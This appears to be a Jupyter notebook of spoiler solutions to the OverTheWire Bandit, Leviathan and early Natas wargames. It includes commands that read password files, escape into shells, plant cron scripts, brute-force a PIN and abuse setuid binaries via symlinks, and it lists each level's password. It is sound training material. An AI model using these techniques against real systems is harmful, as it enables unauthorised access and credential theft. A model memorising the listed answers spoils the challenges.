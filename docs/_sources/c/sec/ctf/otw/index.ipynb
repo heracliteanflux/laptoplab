{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# OverTheWire"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[ [h](https://overthewire.org/wargames/) ] OverTheWire"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<p style=\"color: red; font-size: 24px;\">\n",
    "SPOILERS! This page contains solutions. Proceed with caution.\n",
    "</p>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Table of Contents\n",
    "```{contents}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<p style=\"color: red; font-size: 24px;\">\n",
    "SPOILERS! This page contains solutions. Proceed with caution.\n",
    "</p>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Bandit"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[ [h](https://overthewire.org/wargames/) ] OverTheWire"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "# without config file\n",
    "ssh bandit0@bandit.labs.overthewire.org -p 2220\n",
    "```\n",
    "```bash\n",
    "# ~/.ssh/config\n",
    "Host otw\n",
    "  Hostname bandit.labs.overthewire.org\n",
    "  Port     2220\n",
    "```\n",
    "```bash\n",
    "echo 'bandit0'                                                                                                     > passwd00\n",
    "pbcopy <passwd00 && ssh bandit0@otw 'cat readme'                                                                   > passwd01\n",
    "pbcopy <passwd01 && ssh bandit1@otw 'cat ./-'                                                                      > passwd02\n",
    "pbcopy <passwd02 && ssh bandit2@otw 'cat spaces\\ in\\ this\\ filename'                                               > passwd03\n",
    "pbcopy <passwd03 && ssh bandit3@otw 'cat inhere/.hidden'                                                           > passwd04\n",
    "\n",
    "#----------[ 04 ]\n",
    "pbcopy <passwd04 && ssh bandit4@otw 'for fn in inhere/* ; do file \"$fn\" ; done'                                    > passwd05_supp\n",
    "pbcopy <passwd04 && ssh bandit4@otw 'cat inhere/-file07'                                                           > passwd05\n",
    "\n",
    "#----------[ 05 ]\n",
    "pbcopy <passwd05 && ssh bandit5@otw 'find inhere -type f -size 1033c ! -executable -exec file '{}' \\;'             > passwd06_supp\n",
    "pbcopy <passwd05 && ssh bandit5@otw \"cat inhere/maybehere07/.file2 | tr -d ' '\"                                    > passwd06\n",
    "\n",
    "#----------[ 06 ]\n",
    "pbcopy <passwd06 && ssh bandit6@otw 'find / -size 33c -user bandit7 -group bandit6'                                > passwd07_supp 2>/dev/null\n",
    "pbcopy <passwd06 && ssh bandit6@otw 'cat /var/lib/dpkg/info/bandit7.password'                                      > passwd07\n",
    "\n",
    "#----------[ 07 ]\n",
    "pbcopy <passwd07 && ssh bandit7@otw \"find / -type f -name data.txt -exec grep millionth '{}' \\; | cut -d$'\\t' -f2\" > passwd08 2>/dev/null\n",
    "\n",
    "#----------[ 08 ]\n",
    "pbcopy <passwd08 && ssh bandit8@otw 'sort <data.txt | uniq -u'                                                     > passwd09\n",
    "\n",
    "#----------[ 09 ]\n",
    "# command `strings`\n",
    "pbcopy <passwd09 && ssh bandit9@otw \"egrep -ao '=+.*\\b[[:print:]]{2,}\\b' data.txt\"                                 > passwd10_supp\n",
    "echo 'G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s'                                                                            > passwd10\n",
    "\n",
    "#----------[ 10 ]\n",
    "pbcopy <passwd10 && ssh bandit10@otw \"base64 -d data.txt | cut -d' ' -f4\"                                          > passwd11\n",
    "\n",
    "#----------[ 11 ]\n",
    "# https://en.wikipedia.org/wiki/ROT13\n",
    "pbcopy <passwd11 && ssh bandit11@otw \"<data.txt tr 'N-ZA-Mn-za-m' 'A-Za-z' | cut -d' ' -f4\"                        > passwd12\n",
    "\n",
    "#----------[ 12 ]\n",
    "# https://en.wikipedia.org/wiki/Hex_dump\n",
    "pbcopy <passwd12 && ssh bandit12@otw 'cat data.txt' > passwd13_supp0\n",
    "file passwd13_supp0 # ASCII text\n",
    "xxd -r passwd13_supp0                               > passwd13_supp1\n",
    "file passwd13_supp1 # gzip compressed data, was \"data2.bin\", last modified: Thu Oct  5 06:19:20 2023, max compression, from Unix, original size modulo 2^32 573\n",
    "cp passwd13_supp1 passwd13_supp2.gz && gzip -d passwd13_supp2.gz\n",
    "file passwd13_supp2 # bzip2 compressed data, block size = 900k\n",
    "cp passwd13_supp2 passwd13_supp3.bz && bzip2 -d passwd13_supp3.bz\n",
    "file passwd13_supp3 # gzip compressed data, was \"data4.bin\", last modified: Thu Oct  5 06:19:20 2023, max compression, from Unix, original size modulo 2^32 20480\n",
    "cp passwd13_supp3 passwd13_supp4.gz && gzip -d passwd13_supp4.gz\n",
    "file passwd13_supp4 # POSIX tar archive (GNU)\n",
    "cp passwd13_supp4 passwd13_supp5.tar && tar -xf passwd13_supp5.tar && mv data5.bin passwd13_supp5\n",
    "file passwd13_supp5 # POSIX tar archive (GNU)\n",
    "cp passwd13_supp5 passwd13_supp6.tar && tar -xf passwd13_supp6.tar && mv data6.bin passwd13_supp6\n",
    "file passwd13_supp6 # bzip2 compressed data, block size = 900k\n",
    "cp passwd13_supp6 passwd13_supp7.bz && bzip2 -d passwd13_supp7.bz\n",
    "file passwd13_supp7 # POSIX tar archive (GNU)\n",
    "cp passwd13_supp7 passwd13_supp8.tar && tar -xf passwd13_supp8.tar && mv data8.bin passwd13_supp8\n",
    "file passwd13_supp8 # gzip compressed data, was \"data9.bin\", last modified: Thu Oct  5 06:19:20 2023, max compression, from Unix, original size modulo 2^32 49\n",
    "cp passwd13_supp8 passwd13_supp9.gz && gzip -d passwd13_supp9.gz\n",
    "file passwd13_supp9 # ASCII text\n",
    "cut -d' ' -f4 <passwd13_supp9 >passwd13\n",
    "\n",
    "#----------[ 13 ]\n",
    "pbcopy <passwd13 && ssh bandit13@otw \"ssh bandit14@localhost -p 2220 -i sshkey.private -o StrictHostKeyChecking=no 'cat /etc/bandit_pass/bandit14'\" > passwd14\n",
    "\n",
    "#----------[ 14 ]\n",
    "pbcopy <passwd14 && ssh bandit14@otw \"echo $(cat passwd14) | nc localhost 30000 | sed -n '2p'\"                   > passwd15\n",
    "\n",
    "#----------[ 15 ]\n",
    "pbcopy <passwd15 && ssh bandit15@otw \"echo $(cat passwd15) | openssl s_client -connect localhost:30001 -ign_eof\" > passwd16_supp 2>/dev/null\n",
    "sed -n '/Correct!/{n;p;}' passwd16_supp                                                                          > passwd16\n",
    "\n",
    "#----------[ 16 ]\n",
    "pbcopy <passwd16 && ssh bandit16@otw 'nc -vz localhost 31000-32000 2>&1 | grep succeed'\n",
    "pbcopy <passwd16 && ssh bandit16@otw 'nmap -sV localhost -p 31000-32000 2>&1 | grep ssl'                         > passwd17_supp_nmap\n",
    "# either or ^ (second command displays ssl info)\n",
    "pbcopy <passwd16 && ssh bandit16@otw \"echo $(cat passwd16) | openssl s_client -connect localhost:31790 -ign_eof 2>/dev/null | sed -n '/BEGIN RSA/,/END RSA/p'\" > passwd17_supp\n",
    "\n",
    "pbcopy <passwd16 && ssh bandit16@otw \"mkdir -p /tmp/heracliteanflux_bandit16 && echo $(cat passwd16) | openssl s_client -connect localhost:31790 -ign_eof 2>/dev/null | sed -n '/BEGIN RSA/,/END RSA/p' > /tmp/heracliteanflux_bandit16/sshkey.private ; chmod 400 /tmp/heracliteanflux_bandit16/sshkey.private ; ssh bandit17@localhost -p 2220 -i /tmp/heracliteanflux_bandit16/sshkey.private -o StrictHostKeyChecking=no 'cat /etc/bandit_pass/bandit17' 2>/dev/null\" > passwd17\n",
    "\n",
    "#----------[ 17 ]\n",
    "pbcopy <passwd17 && ssh bandit17@otw \"sdiff -s pass* | tr -d $' \\t' | cut -d'|' -f2\" > passwd18\n",
    "\n",
    "#----------[ 18 ]\n",
    "pbcopy <passwd18 && ssh bandit18@otw 'cat readme' > passwd19\n",
    "\n",
    "#----------[ 19 ]\n",
    "pbcopy <passwd19 && ssh bandit19@otw './bandit20-do cat /etc/bandit_pass/bandit20' > passwd20\n",
    "\n",
    "#----------[ 20 ]\n",
    "# the background process is wrapped in parentheses to suppress the job control output\n",
    "# command `sleep 1` gives the server a chance to start before a connection is made\n",
    "# command `./suconnect 1234` STDOUT is discarded, password is \"transmitted back\"\n",
    "pbcopy <passwd20 && ssh bandit20@otw \"(echo $(cat passwd20) | nc -lp1234 &) ; sleep 1 ; ./suconnect 1234 >/dev/null\" > passwd21\n",
    "\n",
    "#----------[ 21 ]\n",
    "pbcopy <passwd21 && ssh bandit21@otw 'cat /etc/cron.d/cronjob_bandit22'                                > passwd22_supp0\n",
    "pbcopy <passwd21 && ssh bandit21@otw 'cat /usr/bin/cronjob_bandit22.sh'                                > passwd22_supp1\n",
    "pbcopy <passwd21 && ssh bandit21@otw 'cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv'                       > passwd22\n",
    "\n",
    "#----------[ 22 ]\n",
    "pbcopy <passwd22 && ssh bandit22@otw 'cat /etc/cron.d/cronjob_bandit23'                                > passwd23_supp0\n",
    "pbcopy <passwd22 && ssh bandit22@otw 'cat /usr/bin/cronjob_bandit23.sh'                                > passwd23_supp1\n",
    "pbcopy <passwd22 && ssh bandit22@otw \"cat /tmp/\\$(echo 'I am user bandit23' | md5sum | cut -d' ' -f1)\" > passwd23\n",
    "\n",
    "#----------[ 23 ]\n",
    "pbcopy <passwd23 && ssh bandit23@otw 'cat /etc/cron.d/cronjob_bandit24' > passwd24_supp0\n",
    "pbcopy <passwd23 && ssh bandit23@otw 'cat /usr/bin/cronjob_bandit24.sh' > passwd24_supp1\n",
    "pbcopy <passwd23 && ssh bandit23@otw \"temp_dir=\\$(mktemp -d) && cd \\$temp_dir && echo -e \\\"#\\!/usr/bin/env bash\\ncat /etc/bandit_pass/bandit24 > \\$temp_dir/password\\\" > bandit24.sh && chmod o+wx \\$temp_dir && chmod o+x bandit24.sh && cp bandit24.sh /var/spool/bandit24/foo/bandit24.sh && while true ; do if [[ -f password ]] ; then cat password && break ; fi ; done\" > passwd24\n",
    "\n",
    "#----------[ 24 ]\n",
    "# `$(cat passwd24)` or `\\$(cat /etc/bandit_pass/bandit24)`\n",
    "pbcopy <passwd24 && ssh bandit24@otw \"pass=$(cat passwd24) && printf \\\"\\$pass %s\\n\\\" {9999..0000} | nc localhost 30002 -w1 | grep -i password\" > passwd25_supp\n",
    "cat passwd25_supp | tail -1 | rev | cut -d' ' -f1 | rev                                                                                        > passwd25\n",
    "\n",
    "\n",
    "#----------[ 25 ]\n",
    "pbcopy <passwd25 && ssh bandit25@otw 'cat /etc/passwd | grep bandit26'\n",
    "pbcopy <passwd25 && ssh bandit25@otw 'cat /usr/bin/showtext'\n",
    "pbcopy <passwd25 && ssh bandit25@otw \"ssh bandit26@localhost -p 2220 -i bandit26.sshkey -o StrictHostKeyChecking=no\"\n",
    "# make the terminal screen small to force command `more` into interactive mode\n",
    "# then press `v` to open up the vim text editor\n",
    "#\n",
    "# `:e /etc/bandit_pass/bandit26`\n",
    "# or\n",
    "# `:set shell=/bin/bash`\n",
    "# `:shell`\n",
    "# `cat /etc/bandit_pass/bandit26`\n",
    "\n",
    "# passwd26\n",
    "#\n",
    "# c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1\n",
    "\n",
    "\n",
    "#----------[ 26 ]\n",
    "# LOCAL MACHINE\n",
    "pbcopy <passwd26 && ssh bandit26@otw\n",
    "\n",
    "# REMOTE MACHINE\n",
    "./bandit27-do\n",
    "./bandit27-do cat /etc/bandit_pass/bandit27\n",
    "\n",
    "# passwd27\n",
    "#\n",
    "# YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS\n",
    "\n",
    "\n",
    "#----------[ 27 ]\n",
    "# LOCAL MACHINE\n",
    "pbcopy <passwd27 && ssh bandit27@otw\n",
    "#\n",
    "# this doesn't work (...yet)\n",
    "#pbcopy <passwd27 && ssh bandit27@otw \"temp_dir=\\$(mktemp -d) && cd \\\"\\$temp_dir\\\" && GIT_SSH_COMMAND=\\\"ssh -o StrictHostKeyChecking=accept-new\\\" git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo && echo -e YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS'\\n' && cat repo/README\"\n",
    "\n",
    "# REMOTE MACHINE\n",
    "temp_dir=$(mktemp -d) && cd \"$temp_dir\" && GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=accept-new' git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo\n",
    "cat repo/README\n",
    "\n",
    "# passwd28\n",
    "#\n",
    "# AVanL161y9rsbcJIsFHuw35rjaOM19nR\n",
    "\n",
    "\n",
    "#----------[ 28 ]\n",
    "# LOCAL MACHINE\n",
    "pbcopy <passwd28 && ssh bandit28@otw\n",
    "\n",
    "# REMOTE MACHINE\n",
    "temp_dir=$(mktemp -d) && cd \"$temp_dir\" && GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=accept-new' git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo\n",
    "cd repo\n",
    "cat README               # password is hidden\n",
    "git log                  # there are 3 commits; the last commit \"fix[ed] info leak\"\n",
    "git switch f08b --detach # switch to the last commit\n",
    "cat README               # password is visible\n",
    "\n",
    "# passwd29\n",
    "#\n",
    "# tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S\n",
    "\n",
    "\n",
    "#----------[ 29 ]\n",
    "# LOCAL MACHINE\n",
    "pbcopy <passwd29 && ssh bandit29@otw\n",
    "\n",
    "# REMOTE MACHINE\n",
    "temp_dir=$(mktemp -d) && cd \"$temp_dir\" && GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=accept-new' git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo\n",
    "cd repo\n",
    "cat README     # there is no password \"in production\"\n",
    "git log        # there are 2 (unhelpful) commits\n",
    "git branch -a  # there are 3 branches: master, dev, and sploits-dev\n",
    "git switch dev\n",
    "cat README     # password is visible\n",
    "\n",
    "# passwd30\n",
    "#\n",
    "# xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS\n",
    "\n",
    "\n",
    "#----------[ 30 ]\n",
    "# LOCAL MACHINE\n",
    "pbcopy <passwd30 && ssh bandit30@otw\n",
    "\n",
    "# REMOTE MACHINE\n",
    "temp_dir=$(mktemp -d) && cd \"$temp_dir\" && GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=accept-new' git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo\n",
    "cd repo\n",
    "\n",
    "# various views, not to be run in any particular order\n",
    "git show-ref --tag         # 831a... refs/tags/secret\n",
    "git for-each-ref refs/tags # 831a... blob   refs/tags/secret\n",
    "git cat-file -t secret     # blob\n",
    "\n",
    "# there is a tag called `secret`\n",
    "git tag -l\n",
    "git show secret\n",
    "\n",
    "# passwd31\n",
    "#\n",
    "# OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt\n",
    "\n",
    "\n",
    "#----------[ 31 ]\n",
    "# LOCAL MACHINE\n",
    "pbcopy <passwd31 && ssh bandit31@otw\n",
    "\n",
    "# REMOTE MACHINE\n",
    "temp_dir=$(mktemp -d) && cd \"$temp_dir\" && GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=accept-new' git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo\n",
    "cd repo\n",
    "\n",
    "# the following command are useless\n",
    "#git log\n",
    "#git branch -a\n",
    "#git reflog\n",
    "#git show-ref\n",
    "\n",
    "cat README                      # explains that you must push a file called `key.txt` with the content `May I come in?` to the remote repo\n",
    "echo 'May I come in?' > key.txt\n",
    "git add -f key.txt              # circumvent file `.gitignore`, which ignores all text files `*.txt`\n",
    "git commit -m 'success'\n",
    "GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=accept-new' git push\n",
    "\n",
    "# passwd32\n",
    "#\n",
    "# rmCBvG56y58BXzv98yZGdO7ATVL5dW8y\n",
    "\n",
    "\n",
    "#----------[ 32 ]\n",
    "# LOCAL MACHINE\n",
    "pbcopy <passwd32 && ssh bandit32@otw\n",
    "\n",
    "# REMOTE MACHINE\n",
    "$0 # return to a normal shell\n",
    "\n",
    "file uppershell # uppershell: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5074197d6726b13fc82a0fb61036010a9cd40c52, for GNU/Linux 3.2.0, not stripped\n",
    "\n",
    "cat /etc/bandit_pass/bandit33\n",
    "# passwd32\n",
    "#\n",
    "# odHo63fHiFqcWWJG9rLiLDtPm45KzUKy\n",
    "\n",
    "\n",
    "#----------[ 33 ]\n",
    "pbcopy <passwd33 && ssh bandit33@otw 'cat README.txt'\n",
    "\n",
    "# Congratulations on solving the last level of this game!\n",
    "#\n",
    "# At this moment, there are no more levels to play in this game. However, we are constantly working\n",
    "# on new levels and will most likely expand this game with more levels soon.\n",
    "# Keep an eye out for an announcement on our usual communication channels!\n",
    "# In the meantime, you could play some of our other wargames.\n",
    "#\n",
    "# If you have an idea for an awesome new level, please let us know!\n",
    "``````"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<p style=\"color: red; font-size: 24px;\">\n",
    "SPOILERS! This page contains solutions. Proceed with caution.\n",
    "</p>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Leviathan"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[ [h](https://overthewire.org/wargames/) ] OverTheWire"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "# without config file\n",
    "ssh leviathan0@leviathan.labs.overthewire.org -p 2223\n",
    "```\n",
    "```bash\n",
    "# ~/.ssh/config\n",
    "Host otw3\n",
    "  Hostname leviathan.labs.overthewire.org\n",
    "  Port     2223\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "#----------[ 01 ]\n",
    "# LOCAL\n",
    "echo leviathan0 > passwd00\n",
    "pbcopy <passwd00 && ssh leviathan0@otw3 'cat .backup/bookmarks.html | grep password' > passwd01\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "#----------[ 02 ]\n",
    "# LOCAL\n",
    "pbcopy <passwd01 && ssh leviathan1@otw3 \n",
    "\n",
    "# REMOTE\n",
    "ltrace ./check # enter an arbitrary password to view the password `sex`\n",
    "./check        # enter password `sex`\n",
    "whoami         # leviathan2\n",
    "cat /etc/leviathan_pass/leviathan2\n",
    "\n",
    "# passwd02\n",
    "#\n",
    "# mEh5PNl10e\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "#----------[ 03 ]\n",
    "# LOCAL\n",
    "pbcopy <passwd02 && ssh leviathan2@otw3 \n",
    "\n",
    "# REMOTE\n",
    "ltrace ./printfile .bash_logout\n",
    "temp_dir=$(mkdtemp -d)\n",
    "touch \"$temp_dir/test file.txt\"\n",
    "ln -s /etc/leviathan_pass/leviathan3 \"$temp_dir/test\"\n",
    "chmod 777 \"$temp_dir\"\n",
    "./printfile \"$temp_dir/test file.txt\"\n",
    "\n",
    "# passwd03\n",
    "#\n",
    "# Q0G8j4sakn\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "#----------[ 04 ]\n",
    "# LOCAL\n",
    "pbcopy <passwd03 && ssh leviathan3@otw3\n",
    "\n",
    "# REMOTE\n",
    "whoami             # `leviathan3`\n",
    "ltrace ./level3    # the password is `snlprintf`\n",
    "./level3 snlprintf # `[You've got shell]!`\n",
    "whoami             # `leviathan4`\n",
    "cat /etc/leviathan_pass/leviathan4\n",
    "\n",
    "# passwd04\n",
    "#\n",
    "# AgvropI4OA\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "#----------[ 05 ]\n",
    "# LOCAL\n",
    "pbcopy <passwd04 && ssh leviathan4@otw3 \"for bin in \\$(.trash/bin) ; do printf \\\\\\\\x\\$(printf \\\"%x\\\" \\$((2#\\$bin))) ; done\" > passwd05\n",
    "\n",
    "# any of these will work\n",
    "#\n",
    "# for bin in $(.trash/bin) ; do printf \\\\x$(printf \"%x\" $((2#$bin))) ; done\n",
    "# for bin in $(.trash/bin) ; do printf \\\\$(printf \"%o\" $((2#$bin))) ; done\n",
    "# for bin in $(.trash/bin) ; do printf \"%x\" $((2#$bin)) ; done | xxd -r -p\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "#----------[ 06 ]\n",
    "# LOCAL\n",
    "pbcopy <passwd05 && ssh leviathan5@otw3 \"ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log && ./leviathan5\" > passwd06\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "#----------[ 07 ]\n",
    "# LOCAL\n",
    "pbcopy <passwd06 && ssh leviathan6@otw3\n",
    "\n",
    "# REMOTE\n",
    "\n",
    "# brute-force approach\n",
    "for ((i=0; i<10000; i++)) ; do ./leviathan6 \"$i\" ; done\n",
    "\n",
    "# reverse-engineering approach\n",
    "gdb --args leviathan6 0000\n",
    "(gdb) disassemble main   # view the assembly code of function `main`\n",
    "(gdb) break *0x0804922a  # set a breakpoint at the line `0x0804922a <+84>:    cmp    %eax,-0xc(%ebp)`\n",
    "(gdb) run                # start the program\n",
    "(gdb) info registers\n",
    "(gdb) print $ebp-0xc     # `$1 = (void *) 0xffffd4dc` - calculate the value of the address\n",
    "(gdb) x 0xffffd4dc       # `0xffffd4dc:     0x00001bd3` - print the value saved at the hex address\n",
    "(gdb) print/d 0x00001bd3 # `$2 = 7123`\n",
    "\n",
    "# passwd07\n",
    "#\n",
    "# 8GpZ5f8Hze\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "#----------[ 08 ]\n",
    "# LOCAL\n",
    "pbcopy <passwd07 && ssh leviathan7@otw3 'cat CONGRATULATIONS'\n",
    "# Well Done, you seem to have used a *nix system before, now try something more serious.\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<p style=\"color: red; font-size: 24px;\">\n",
    "SPOILERS! This page contains solutions. Proceed with caution.\n",
    "</p>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[ [h](https://overthewire.org/wargames/) ] OverTheWire"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas Script"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "#!/usr/bin/env bash\n",
    "#\n",
    "# natas\n",
    "\n",
    "while getopts 'b:c:d:e:F:ILp:r:s' opt ; do\n",
    "  case \"$opt\" in\n",
    "    ( b ) CURL_b=\"-b $OPTARG\" ;;\n",
    "    ( d ) DATA=\"-d $OPTARG\" ;;\n",
    "    ( e ) CURL_e=\"-e $OPTARG\" ;;\n",
    "    ( F ) CURL_F+=(\"-F $OPTARG\") ;;\n",
    "    ( I ) CURL_I=\"-I\" ;;\n",
    "    ( L ) CURL_L=\"-L\" ;;\n",
    "    ( p ) PARAMS=\"?$OPTARG\" ;;\n",
    "    ( r ) REL=\"/$OPTARG\" ;;\n",
    "    ( s ) SED= ;;\n",
    "    ( * ) exit 2 ;;\n",
    "  esac\n",
    "done\n",
    "shift $((OPTIND-1))\n",
    "\n",
    "LVL=\"$1\"\n",
    "res=\"$(curl \"$CURL_b\" \"$CURL_e\" \"${CURL_F[@]}\" \"$CURL_I\" \"$CURL_L\" \\\n",
    "-su \"natas$((10#$LVL)):$(cat \"passwd$LVL\")\" \"http://natas$((10#$LVL)).natas.labs.overthewire.org$REL$PARAMS\" \"$DATA\")\"\n",
    "\n",
    "# echo curl \"$CURL_b\" \"$CURL_e\" ${CURL_F[@]} \"$CURL_I\" \"$CURL_L\" \\\n",
    "# -su \"natas$((10#$LVL)):$(cat \"passwd$LVL\")\" \"http://natas$((10#$LVL)).natas.labs.overthewire.org$REL$PARAMS\" \"$DATA\"\n",
    "\n",
    "if [ -v SED ] ; then\n",
    "  echo \"$res\" \\\n",
    "  | sed -E 's/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/<br \\/>/\\n/g; s/<\\/?span[^>]*>//g' \\\n",
    "  | sed -n '1,/\\/head/d;/\\/bo/q;p' #sed -n '/bo/,/\\/bo/p'\n",
    "else\n",
    "  echo \"$res\"\n",
    "fi\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas0 - viewing page source"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 00\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas0</h1>\n",
    "<div id=\"content\">\n",
    "You can find the password for the next level on this page.\n",
    "\n",
    "<!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas1 - viewing page source"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 01\n",
    "```\n",
    "```html\n",
    "<body oncontextmenu=\"javascript:alert('right clicking has been blocked!');return false;\">\n",
    "<h1>natas1</h1>\n",
    "<div id=\"content\">\n",
    "You can find the password for the\n",
    "next level on this page, but rightclicking has been blocked!\n",
    "\n",
    "<!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas2 - sub directories"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 02\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas2</h1>\n",
    "<div id=\"content\">\n",
    "There is nothing on this page\n",
    "<img src=\"files/pixel.png\">\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -Lsr files 02\n",
    "```\n",
    "```html\n",
    " <body>\n",
    "<h1>Index of /files</h1>\n",
    "  <table>\n",
    "   <tr><th valign=\"top\"><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?C=N;O=D\">Name</a></th><th><a href=\"?C=M;O=A\">Last modified</a></th><th><a href=\"?C=S;O=A\">Size</a></th><th><a href=\"?C=D;O=A\">Description</a></th></tr>\n",
    "   <tr><th colspan=\"5\"><hr></th></tr>\n",
    "<tr><td valign=\"top\"><img src=\"/icons/back.gif\" alt=\"[PARENTDIR]\"></td><td><a href=\"/\">Parent Directory</a></td><td> </td><td align=\"right\">  - </td><td> </td></tr>\n",
    "<tr><td valign=\"top\"><img src=\"/icons/image2.gif\" alt=\"[IMG]\"></td><td><a href=\"pixel.png\">pixel.png</a></td><td align=\"right\">2023-10-05 06:15  </td><td align=\"right\">303 </td><td> </td></tr>\n",
    "<tr><td valign=\"top\"><img src=\"/icons/text.gif\" alt=\"[TXT]\"></td><td><a href=\"users.txt\">users.txt</a></td><td align=\"right\">2023-10-05 06:15  </td><td align=\"right\">145 </td><td> </td></tr>\n",
    "   <tr><th colspan=\"5\"><hr></th></tr>\n",
    "</table>\n",
    "<address>Apache/2.4.52 (Ubuntu) Server at natas2.natas.labs.overthewire.org Port 80</address>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -Lr files/users.txt 02\n",
    "```\n",
    "```\n",
    "bob:jw2ueICLvT\n",
    "charlie:G5vCxkVV3m\n",
    "natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q\n",
    "eve:zo4mJWyNj2\n",
    "mallory:9urtcpzBmH\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas3 - robots.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 03\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas3</h1>\n",
    "<div id=\"content\">\n",
    "There is nothing on this page\n",
    "<!-- No more information leaks!! Not even Google will find it this time... -->\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -r robots.txt 03\n",
    "```\n",
    "```\n",
    "User-agent: *\n",
    "Disallow: /s3cr3t/\n",
